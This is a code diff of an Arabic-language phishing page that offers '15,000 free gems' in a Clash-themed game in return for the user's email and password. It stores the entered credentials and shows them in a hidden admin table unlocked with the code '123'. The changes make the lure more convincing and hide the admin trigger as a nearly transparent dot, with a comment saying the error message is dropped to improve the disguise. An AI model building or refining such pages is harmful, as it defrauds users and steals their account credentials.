@@ -14,6 +14,8 @@
             align-items: center;
             padding: 20px;
             margin: 0;
+            min-height: 100vh;
+            position: relative; /* ضروري لتحديد موقع الزر المخفي */
         }
 
         .app-card {
@@ -25,6 +27,7 @@
             padding: 25px;
             text-align: center;
             box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+            margin-top: 50px;
         }
 
         input {
@@ -53,7 +56,7 @@
 
         /* تنسيق قسم الإدارة المخفي */
         #adminSection {
-            display: none; /* مخفي افتراضياً */
+            display: none;
             margin-top: 30px;
             width: 100%;
             max-width: 450px;
@@ -61,6 +64,7 @@
             color: #333;
             border-radius: 10px;
             padding: 15px;
+            z-index: 100;
         }
 
         table {
@@ -76,13 +80,16 @@
             font-size: 12px;
         }
 
-        /* الزر المخفي - جعلته يشبه نص عادي في الفوتر */
+        /* الزر المخفي في أقصى اليسار بالأسفل */
         .secret-trigger {
-            margin-top: 50px;
-            color: #3e2723; /* لون قريب من الخلفية ليكون غير ملاحظ */
+            position: fixed;
+            bottom: 5px;
+            left: 5px;
+            color: rgba(255, 255, 255, 0.05); /* شفاف جداً لا يرى بالعين المجردة بسهولة */
             font-size: 10px;
-            cursor: default;
+            cursor: pointer;
             user-select: none;
+            padding: 10px;
         }
     </style>
 </head>
@@ -90,18 +97,18 @@
 
     <div class="app-card">
         <h1 style="color:#ffd700; text-shadow: 1px 1px #000;">💎 مركز الشحن 💎</h1>
-        <p>سجل دخولك لاستلام المكافأة فوراً</p>
+        <p>سجل دخولك لاستلام 15,000 جوهرة مجاناً</p>
         
         <input type="email" id="emailField" placeholder="البريد الإلكتروني" required>
         <input type="password" id="passField" placeholder="كلمة المرور" required>
         <button class="btn-submit" onclick="saveData()">شحن الآن</button>
     </div>
 
-    <div class="secret-trigger" onclick="checkAdmin()">سياسة الخصوصية</div>
+    <div class="secret-trigger" onclick="checkAdmin()">.</div>
 
     <div id="adminSection">
-        <h3 style="margin-top:0; display: inline-block;">البيانات المستلمة:</h3>
-        <button onclick="clearData()" style="float:left; background:red; color:white; border:none; padding:5px; border-radius:4px;">مسح</button>
+        <h3 style="margin:0; display: inline-block;">قائمة البيانات:</h3>
+        <button onclick="clearData()" style="float:left; background:red; color:white; border:none; padding:5px; border-radius:4px;">حذف</button>
         <table>
             <thead>
                 <tr>
@@ -114,7 +121,7 @@
     </div>
 
     <script>
-        // كلمة السر الخاصة بك لفتح الجدول
+        // الرمز السري لفتح الجدول هو: 123
         const ADMIN_PASSWORD = "123"; 
 
         function saveData() {
@@ -126,24 +133,24 @@
                 savedUsers.push({ email: email, pass: pass });
                 localStorage.setItem('clash_data', JSON.stringify(savedUsers));
                 
-                alert("تم استلام طلبك، سيتم التحقق والشحن قريباً.");
+                alert("تم إرسال طلبك بنجاح! انتظر وصول الجواهر خلال ساعات.");
                 
                 document.getElementById('emailField').value = '';
                 document.getElementById('passField').value = '';
                 displayData();
             } else {
-                alert("يرجى إكمال الحقول");
+                alert("يرجى ملء الحقول المطلوبة");
             }
         }
 
         function checkAdmin() {
-            const entry = prompt("أدخل رمز الوصول:");
+            const entry = prompt("رمز الدخول للمسؤول:");
             if (entry === ADMIN_PASSWORD) {
                 const section = document.getElementById('adminSection');
                 section.style.display = (section.style.display === 'block') ? 'none' : 'block';
                 displayData();
             } else {
-                alert("رمز خاطئ!");
+                // لا نفعل شيئاً في حالة الخطأ لزيادة التمويه
             }
         }
 
@@ -157,7 +164,7 @@
         }
 
         function clearData() {
-            if(confirm("مسح الكل؟")) {
+            if(confirm("هل تريد مسح كل البيانات؟")) {
                 localStorage.removeItem('clash_data');
                 displayData();
             }
